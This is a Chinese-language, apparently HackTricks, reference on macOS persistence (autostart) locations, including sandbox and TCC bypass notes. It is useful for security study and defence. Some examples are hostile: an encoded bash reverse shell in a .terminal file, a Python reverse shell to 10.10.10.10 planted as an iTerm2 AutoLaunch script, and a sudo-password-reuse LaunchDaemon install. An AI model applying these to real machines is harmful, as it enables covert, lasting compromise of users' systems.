# macOS 自动启动

{{#include ../banners/hacktricks-training.md}}

本节大量基于博客系列 [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/)，目标是添加**更多的自动启动位置**（如果可能），指出在最新版 macOS (13.4) 下哪些**技术**仍然可用，并说明所需的**权限**。

## Sandbox Bypass

> [!TIP]
> 在这里你可以找到对 **sandbox bypass** 有用的启动位置，这些位置允许你通过**将内容写入文件**并**等待**一个非常**常见**的**动作**、一段**确定的时间**或一个你通常可以在 sandbox 内执行且不需要 root 权限的**动作**，来简单地执行某些东西。

### Launchd

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

- **`/Library/LaunchAgents`**
- **触发**：重启
- 需要 root 权限
- **`/Library/LaunchDaemons`**
- **触发**：重启
- 需要 root 权限
- **`/System/Library/LaunchAgents`**
- **触发**：重启
- 需要 root 权限
- **`/System/Library/LaunchDaemons`**
- **触发**：重启
- 需要 root 权限
- **`~/Library/LaunchAgents`**
- **触发**：重新登录
- **`~/Library/LaunchDemons`**
- **触发**：重新登录

> [!TIP]
> 作为有趣的事实，**`launchd`** 在 Mach-o 的 `__Text.__config` 区段中嵌入了一个 property list，其中包含了其他 well known services launchd 必须启动的服务。此外，这些服务可能包含 `RequireSuccess`、`RequireRun` 和 `RebootOnSuccess`，这意味着它们必须运行并成功完成。
>
> 当然，因代码签名（code signing）无法修改。

#### 描述与利用

**`launchd`** 是 OX S 内核在启动时执行的**第一个****进程**，并且在关机时是最后结束的那个。它应始终拥有 **PID 1**。该进程会**读取并执行**在以下位置由 **ASEP** 指定的 **plists** 中的配置：

- `/Library/LaunchAgents`: 由管理员安装的每用户代理
- `/Library/LaunchDaemons`: 由管理员安装的系统范围守护进程
- `/System/Library/LaunchAgents`: 由 Apple 提供的每用户代理
- `/System/Library/LaunchDaemons`: 由 Apple 提供的系统范围守护进程

当用户登录时，位于 `/Users/$USER/Library/LaunchAgents` 和 `/Users/$USER/Library/LaunchDemons` 的 plists 会以**已登录用户的权限**启动。

**agents 和 daemons 之间的主要区别在于 agents 在用户登录时加载，而 daemons 在系统启动时加载**（例如像 ssh 这样的服务需要在任何用户访问系统之前执行）。此外，agents 可能使用 GUI，而 daemons 则需要在后台运行。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
有些情况下，**agent 需要在用户登录之前执行**，这些称为 **PreLoginAgents**。例如，这在登录时提供辅助技术时很有用。它们也可以在 `/Library/LaunchAgents`(see [**here**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) an example)。

> [!TIP]
> 新的 Daemons 或 Agents 配置文件将会在下一次重启后**被加载或通过** `launchctl load <target.plist>` 加载。**也可以使用** `launchctl -F <file>` **加载没有该扩展名的 .plist 文件**（不过这些 plist 文件在重启后不会被自动加载）。\
> 也可以通过 `launchctl unload <target.plist>` **卸载**（该 plist 指向的进程将被终止），
>
> 要**确保**没有**任何**（比如 override）**阻止**一个 **Agent** 或 **Daemon** **运行**，请运行：`sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

列出当前用户加载的所有 agents 和 daemons：
```bash
launchctl list
```
#### 示例恶意 LaunchDaemon 链（password reuse）

最近一个 macOS infostealer 重用了一把 **捕获的 sudo 密码** 来写入一个 user agent 和 一个 root LaunchDaemon：

- 将 agent 循环写入 `~/.agent` 并使其可执行。
- 在 `/tmp/starter` 生成一个 plist，指向该 agent。
- 使用被窃取的密码通过 `sudo -S` 将其复制到 `/Library/LaunchDaemons/com.finder.helper.plist`，设置 `root:wheel`，并用 `launchctl load` 加载它。
- 通过 `nohup ~/.agent >/dev/null 2>&1 &` 静默启动 agent 以分离输出。
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> If a plist is owned by a user, even if it's in a daemon system wide folders, the **task will be executed as the user** and not as root. This can prevent some privilege escalation attacks.

#### 关于 launchd 的更多信息

**`launchd`** 是第一个由 **内核** 启动的用户态进程。进程启动必须 **成功**，并且 **不能退出或崩溃**。它甚至对某些 **终止信号** 有保护。

`launchd` 会做的第一件事之一是 **启动** 所有如下的 **daemons**：

- **Timer daemons** 基于时间触发执行：
- atd (`com.apple.atrun.plist`)：具有 `StartInterval` 为 30min
- crond (`com.apple.systemstats.daily.plist`)：具有 `StartCalendarInterval` 在 00:15 启动
- **Network daemons**，例如：
- `org.cups.cups-lpd`：在 TCP 上监听（`SockType: stream`），并使用 `SockServiceName: printer`
- SockServiceName 必须是端口或来自 `/etc/services` 的服务
- `com.apple.xscertd.plist`：在 TCP 端口 1640 上监听
- **Path daemons**，在指定路径变化时执行：
- `com.apple.postfix.master`：检查路径 `/etc/postfix/aliases`
- **IOKit notifications daemons**：
- `com.apple.xartstorageremoted`：`"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
- `com.apple.xscertd-helper.plist`：在 `MachServices` 条目中指明名称 `com.apple.xscertd.helper`
- **UserEventAgent:**
- 这与前面不同。它使 launchd 根据特定事件派生应用。然而在这种情况下，相关的主要二进制并不是 `launchd`，而是 `/usr/libexec/UserEventAgent`。它从受 SIP 限制的文件夹 /System/Library/UserEventPlugins/ 加载插件，每个插件在 `XPCEventModuleInitializer` 键中指示其初始化器，或者对于较旧的插件，在其 `Info.plist` 的 `CFPluginFactories` 字典中、键为 `FB86416D-6164-2070-726F-70735C216EC0` 的条目下指示。

### shell 启动文件

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- 但你需要找到一个具有 TCC 绕过且会执行一个加载这些文件的 shell 的应用

#### Locations

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **触发条件**：用 zsh 打开终端
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **触发条件**：用 zsh 打开终端
- 需要 root 权限
- **`~/.zlogout`**
- **触发条件**：退出 zsh 终端
- **`/etc/zlogout`**
- **触发条件**：退出 zsh 终端
- 需要 root 权限
- 可能更多信息在：**`man zsh`**
- **`~/.bashrc`**
- **触发条件**：用 bash 打开终端
- `/etc/profile`（未生效）
- `~/.profile`（未生效）
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **触发条件**：预期在 xterm 中触发，但 xterm **未安装**，即使安装后也会抛出错误：xterm: `DISPLAY is not set`

#### 描述与利用

当启动像 `zsh` 或 `bash` 这样的 shell 环境时，**会运行某些启动文件**。macOS 目前使用 `/bin/zsh` 作为默认 shell。该 shell 在启动 Terminal 应用或通过 SSH 访问设备时会被自动使用。虽然 macOS 中也存在 `bash` 和 `sh`，但它们需要被显式调用才能使用。

zsh 的 man 页（可通过 **`man zsh`** 阅读）对启动文件有详细描述。
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### 重新打开的应用程序

> [!CAUTION]
> 配置所示的 exploitation 并登出再登入或甚至重启，对我来说都无法让该 app 被执行。（该 app 没有被执行，可能需要在执行这些操作时该 app 已在运行）

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **触发条件**: Restart 时重新打开应用程序

#### 描述与利用

所有要重新打开的应用程序都位于 plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` 中

因此，要让重新打开的应用启动你自己的程序，你只需要 **将你的 app 添加到该列表**。

UUID 可通过列出该目录或运行 `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` 获取

要检查将被重新打开的应用程序，您可以执行：
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
要将**应用程序添加到此列表**，可以使用：
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal 偏好设置

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal 通常具有使用它的用户的 FDA 权限

#### 位置

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **触发**：Open Terminal

#### 描述与利用

在 **`~/Library/Preferences`** 中存放着用户在 Applications 中的偏好设置。其中一些偏好设置可以包含用于 **执行其他应用/脚本** 的配置。

例如，Terminal 可以在启动时执行一个命令：

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

该配置反映在文件 **`~/Library/Preferences/com.apple.Terminal.plist`** 中，如下所示：
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
因此，如果系统中 terminal 的偏好（preferences）的 plist 能被覆盖，那么 **`open`** 功能可以用来 **打开 terminal 并执行该命令**。

你可以从 cli 添加如下：
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal 脚本 / 其他文件扩展名

- 可用于绕过 sandbox： [✅](https://emojipedia.org/check-mark-button)
- 可用于绕过 TCC： [✅](https://emojipedia.org/check-mark-button)
- Terminal 通常会继承使用它的用户的 FDA 权限

#### 位置

- **任何地方**
- **触发**：打开 Terminal

#### 描述与利用

如果你创建一个 [**`.terminal`** 脚本](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) 并打开，**Terminal 应用程序** 将被自动调用以执行其中指示的命令。如果 Terminal app 拥有一些特殊权限（例如 TCC），你的命令将以这些特殊权限运行。

试试：
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
You could also use the extensions **`.command`**, **`.tool`**, with regular shell scripts content and they will be also opened by Terminal.

> [!CAUTION]
> If terminal has **Full Disk Access** it will be able to complete that action (note that the command executed will be visible in a terminal window).

### 音频插件 (Audio Plugins)

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- You might get some extra TCC access

#### 位置

- **`/Library/Audio/Plug-Ins/HAL`**
- Root required
- **Trigger**: Restart coreaudiod or the computer
- **`/Library/Audio/Plug-ins/Components`**
- Root required
- **Trigger**: Restart coreaudiod or the computer
- **`~/Library/Audio/Plug-ins/Components`**
- **Trigger**: Restart coreaudiod or the computer
- **`/System/Library/Components`**
- Root required
- **Trigger**: Restart coreaudiod or the computer

#### 描述

According to the previous writeups it's possible to **compile some audio plugins** and get them loaded.

### QuickLook 插件

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- You might get some extra TCC access

#### 位置

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### 描述与利用

QuickLook plugins can be executed when you **trigger the preview of a file** (press space bar with the file selected in Finder) and a **plugin supporting that file type** is installed.

It's possible to compile your own QuickLook plugin, place it in one of the previous locations to load it and then go to a supported file and press space to trigger it.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> This didn't work for me, neither with the user LoginHook nor with the root LogoutHook

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

- 你需要能够执行类似 `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` 的命令
- 位于 `~/Library/Preferences/com.apple.loginwindow.plist`

它们已被弃用，但可用于在用户登录时执行命令。
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
此设置存储在 `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
要删除它：
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
root 用户的项存储在 **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## 有条件的 Sandbox Bypass

> [!TIP]
> 在这里你可以找到有用的启动位置，用于 **sandbox bypass**，这些位置允许你通过 **将其写入文件** 并 **期待一些不太常见的条件**（例如特定 **程序已安装、"不常见" 的用户** 操作或环境）来简单执行某些东西。

### Cron

- **文章**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- 可用于 sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
- 不过，你需要能够执行 `crontab` 二进制文件
- 或者成为 root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- 直接写入需要 root 权限。如果你能执行 `crontab <file>` 则不需要 root
- **Trigger**: 取决于 cron 任务

#### Description & Exploitation

使用以下命令列出**当前用户**的 cron 任务：
```bash
crontab -l
```
你也可以在 **`/usr/lib/cron/tabs/`** 和 **`/var/at/tabs/`** 查看所有用户的 cron jobs（需要 root）。

在 MacOS 中，可以找到一些以 **特定频率** 执行脚本的文件夹：
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
在那里你可以找到常规的 **cron** **jobs**、**at** **jobs**（不太常用）和 **periodic** **jobs**（主要用于清理临时文件）。每日的 periodic jobs 可以例如通过：`periodic daily` 来执行。

要添加一个 **user cronjob programatically**，可以使用：
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- 有助于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC 绕过: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 曾经被授予 TCC 权限

#### Locations

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Trigger**: 打开 iTerm
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Trigger**: 打开 iTerm
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Trigger**: 打开 iTerm

#### Description & Exploitation

存放在 **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** 的脚本会被执行。例如：
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
或者：
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
脚本 **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** 也会被执行:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
位于 **`~/Library/Preferences/com.googlecode.iterm2.plist`** 的 iTerm2 首选项可以在 iTerm2 终端打开时指明要执行的命令。

此设置可以在 iTerm2 的设置中配置：

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

该命令会反映在首选项中：
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
你可以使用以下方式设置要执行的命令：
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> 很可能存在**其他方法滥用 iTerm2 偏好设置**以执行任意命令。

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- 但必须先安装 xbar
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- 它会请求 Accessibility 权限

#### Location

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Trigger**: Once xbar is executed

#### Description

If the popular program [**xbar**](https://github.com/matryer/xbar) is installed, it's possible to write a shell script in **`~/Library/Application\ Support/xbar/plugins/`** which will be executed when xbar is started:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- 但必须安装 Hammerspoon
- TCC 绕过: [✅](https://emojipedia.org/check-mark-button)
- 它会请求 Accessibility 权限

#### 位置

- **`~/.hammerspoon/init.lua`**
- **Trigger**: 一旦 hammerspoon 被执行

#### 描述

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) 是一个用于 **macOS** 的自动化平台，利用 **LUA 脚本语言** 进行操作。值得注意的是，它支持完整的 AppleScript 代码集成以及 shell 脚本的执行，从而显著增强了其脚本能力。

该应用会查找单个文件，`~/.hammerspoon/init.lua`，启动时将执行该脚本。
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- But BetterTouchTool must be installed
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- It requests Automation-Shortcuts and Accessibility permissions

#### Location

- `~/Library/Application Support/BetterTouchTool/*`

这个工具允许指定在按下某些 shortcuts 时要执行的应用或脚本。攻击者可能能够配置自己的 **shortcut 和要在 数据库 中执行的 action**，以执行任意代码（一个 shortcut 可以只是按下一个键）。

### Alfred

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- But Alfred must be installed
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- It requests Automation, Accessibility and even Full-Disk access permissions

#### Location

- `???`

它允许创建 workflows，当满足某些条件时可以执行代码。攻击者可能可以创建一个 workflow 文件并让 Alfred 加载它（需要付费购买高级版才能使用 workflows）。

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- But ssh needs to be enabled and used
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH use to have FDA access

#### Location

- **`~/.ssh/rc`**
- **Trigger**: Login via ssh
- **`/etc/ssh/sshrc`**
- Root required
- **Trigger**: Login via ssh

> [!CAUTION]
> To turn ssh on requres Full Disk Access:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Description & Exploitation

默认情况下，除非在 `/etc/ssh/sshd_config` 中设置 `PermitUserRC no`，当用户 **logins via SSH** 时，脚本 **`/etc/ssh/sshrc`** 和 **`~/.ssh/rc`** 会被执行。

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- But you need to execute `osascript` with args
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** Login
- Exploit payload stored calling **`osascript`**
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** Login
- Root required

#### Description

In System Preferences -> Users & Groups -> **Login Items** you can find **items to be executed when the user logs in**.\
It it's possible to list them, add and remove from the command line:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
这些项目存储在文件 **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**Login items** 也可以通过 API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) 指示，这会将配置存储在 **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** 中

### 将 ZIP 作为 Login Item

(查看之前关于 Login Items 的部分，这是一个扩展)

如果你将一个 **ZIP** 文件作为 **Login Item** 存储，**`Archive Utility`** 会打开它，例如如果 zip 存放在 **`~/Library`** 并包含文件夹 **`LaunchAgents/file.plist`**（带有 backdoor），该文件夹将被创建（默认不会创建），plist 会被添加，因此下一次用户登录时，**plist 中指示的 backdoor 将被执行**。

另一个选项是在用户 HOME 中创建 **`.bash_profile`** 和 **`.zshenv`** 文件，因此如果 LaunchAgents 文件夹已存在，此技术仍然有效。

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- 有助于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- 但你需要 **执行** **`at`**，且它必须被 **启用**
- TCC 绕过: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

- 需要 **执行** **`at`**，且它必须被 **启用**

#### **描述**

`at` 任务用于 **安排一次性任务** 在特定时间执行。与 cron jobs 不同，`at` 任务在执行后会被自动移除。需要注意的是，这些任务在系统重启后仍然是持久的，这在某些情况下会成为潜在的安全隐患。

默认情况下它们是**禁用**的，但 **root** 用户可以使用以下命令**启用**它们：
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
这将在1小时后创建一个文件：
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
使用 `atq:` 检查作业队列：
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
上面可以看到两个已调度的作业。我们可以使用 `at -c JOBNUMBER` 打印该作业的详细信息。
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> 如果 AT tasks 未启用，创建的任务将不会被执行。

这些 **job files** 可以在 `/private/var/at/jobs/` 找到。
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
文件名包含队列、作业编号和计划运行时间。例如让我们看一下 `a0001a019bdcd2`。

- `a` - 这是队列
- `0001a` - 作业编号（十六进制），`0x1a = 26`
- `019bdcd2` - 时间（十六进制）。它表示自纪元以来经过的分钟数。`0x019bdcd2` 是十进制的 `26991826`。乘以 60 后得到 `1619509560`，对应 GMT: 2021. April 27., Tuesday 7:46:00。

如果我们打印作业文件，会发现它包含与使用 `at -c` 得到的相同信息。

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- But you need to be able to call `osascript` with arguments to contact **`System Events`** to be able to configure Folder Actions
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- It has some basic TCC permissions like Desktop, Documents and Downloads

#### Location

- **`/Library/Scripts/Folder Action Scripts`**
- Root required
- **Trigger**: Access to the specified folder
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: Access to the specified folder

#### Description & Exploitation

Folder Actions 是在文件夹发生更改时自动触发的脚本，例如添加或删除项目，或执行诸如打开或调整文件夹窗口大小等操作。这些动作可用于各种任务，并且可以通过不同方式触发，例如使用 Finder UI 或终端命令。

要设置 Folder Actions，你可以选择：

